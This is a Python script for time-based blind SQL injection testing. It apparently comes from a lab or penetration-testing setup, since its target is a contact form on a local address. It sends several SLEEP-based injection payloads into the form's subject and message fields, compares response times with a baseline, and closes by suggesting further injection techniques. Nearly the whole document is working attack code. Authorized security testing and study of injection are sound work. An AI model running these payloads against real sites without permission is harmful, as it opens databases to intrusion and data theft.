import requests
import time
import statistics
import sys

# Configuration
TARGET_URL = "http://127.0.0.1:33124/send.php"
BASELINE_REQUESTS = 3
SLEEP_DELAY = 5
TIME_THRESHOLD = 4  # Seconds above baseline to consider injection successful

def safe_send_request(data, max_retries=2):
    """Send POST request with retry logic"""
    for attempt in range(max_retries + 1):
        try:
            start_time = time.time()
            response = requests.post(
                TARGET_URL, 
                data=data, 
                allow_redirects=False,  # Don't follow redirects for timing
                timeout=15,  # Shorter timeout
                headers={'Connection': 'close'}  # Force close connection
            )
            end_time = time.time()
            response_time = end_time - start_time
            return response_time, response.status_code, None
        except Exception as e:
            if attempt == max_retries:
                end_time = time.time()
                response_time = end_time - start_time
                return response_time, None, str(e)
            time.sleep(0.5)  # Brief pause before retry
    
    return 0, None, "Max retries exceeded"

def main():
    print("="*70)
    print("Blind SQL Injection - Time-Based Test")
    print(f"Target: {TARGET_URL}")
    print("="*70)
    
    # Realistic form data (benign values)
    benign_data = {
        "fullname": "John Doe",
        "email": "john.doe@example.com",
        "phone": "555-123-4567",
        "subject": "Test Inquiry",
        "message": "This is a test message for contact form."
    }
    
    # Time-based SQL injection payloads
    payloads = [
        "test' AND SLEEP(5)-- -",
        'test" AND SLEEP(5)-- -',
        "test' OR SLEEP(5)-- -",
        "test'+OR+SLEEP(5)--+-",  # URL encoded variant
        "test'+AND+SLEEP(5)--+-"  # URL encoded AND variant
    ]
    
    # Step 1: Establish baseline
    print("\n[+] Establishing baseline response time ({} requests)".format(BASELINE_REQUESTS))
    baseline_times = []
    
    for i in range(BASELINE_REQUESTS):
        try:
            response_time, status, error = safe_send_request(benign_data)
            baseline_times.append(response_time)
            print(f"  Baseline request {i+1}: {response_time:.3f}s (Status: {status})")
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")
            return
        except Exception as e:
            print(f"  Error in baseline request {i+1}: {e}")
            continue
    
    if not baseline_times:
        print("[-] Failed to establish baseline - no successful requests")
        return
    
    baseline_avg = statistics.mean(baseline_times)
    baseline_stdev = statistics.stdev(baseline_times) if len(baseline_times) > 1 else 0
    threshold = baseline_avg + TIME_THRESHOLD
    
    print(f"\n[+] Baseline Statistics:")
    print(f"  Average: {baseline_avg:.3f}s")
    print(f"  Std Dev: {baseline_stdev:.3f}s")
    print(f"  Threshold: {threshold:.3f}s (baseline + {TIME_THRESHOLD}s)")
    
    # Step 2: Test payloads
    print("\n" + "="*70)
    print("[+] PAYLOAD TESTING")
    print("="*70)
    
    successful_tests = []
    
    for payload in payloads:
        for param in ['subject', 'message']:
            print(f"\n{'#'*70}")
            print(f"[+] Testing: payload='{payload}' in parameter='{param}'")
            
            # Create test data with payload in specific parameter
            test_data = benign_data.copy()
            test_data[param] = payload
            
            # Send request with payload
            response_time, status, error = safe_send_request(test_data)
            
            print(f"Response Time: {response_time:.3f}s")
            print(f"Status Code: {status}")
            if error:
                print(f"Error: {error}")
            
            time_diff = response_time - baseline_avg
            is_successful = time_diff >= TIME_THRESHOLD
            
            print(f"Time Difference: {time_diff:+.3f}s")
            print(f"Expected Delay: {time_diff:.3f}s (should be ~{SLEEP_DELAY}s)")
            
            if is_successful:
                print(f"[!] SUCCESS: Delay detected ({time_diff:.3f}s > {TIME_THRESHOLD}s)")
                successful_tests.append({
                    'payload': payload,
                    'parameter': param,
                    'response_time': response_time,
                    'time_diff': time_diff,
                    'status_code': status
                })
            else:
                print(f"[-] No significant delay detected")
    
    # Summary
    print("\n" + "="*70)
    print("[+] FINAL ANALYSIS")
    print("="*70)
    
    if successful_tests:
        print(f"[!] POTENTIAL BLIND SQL INJECTION DETECTED in {len(successful_tests)} test(s)!")
        print("\nSuccessful Tests:")
        for i, test in enumerate(successful_tests, 1):
            print(f"\n  {i}. Parameter: '{test['parameter']}'")
            print(f"     Payload: {test['payload']}")
            print(f"     Response Time: {test['response_time']:.3f}s")
            print(f"     Baseline: {baseline_avg:.3f}s")
            print(f"     Difference: {test['time_diff']:.3f}s")
    else:
        print("[-] No significant time-based delays detected.")
        print("[-] Time-based blind SQL injection does not appear to be present.")
        print("\nNext Steps:")
        print("  1. Try boolean-based blind injection (different responses)")
        print("  2. Test other parameters (fullname, email, phone)")
        print("  3. Try alternative delay functions (BENCHMARK for MySQL)")
        print("  4. Try different payload encodings")
    
    print("\n" + "="*70)

if __name__ == "__main__":
    main()

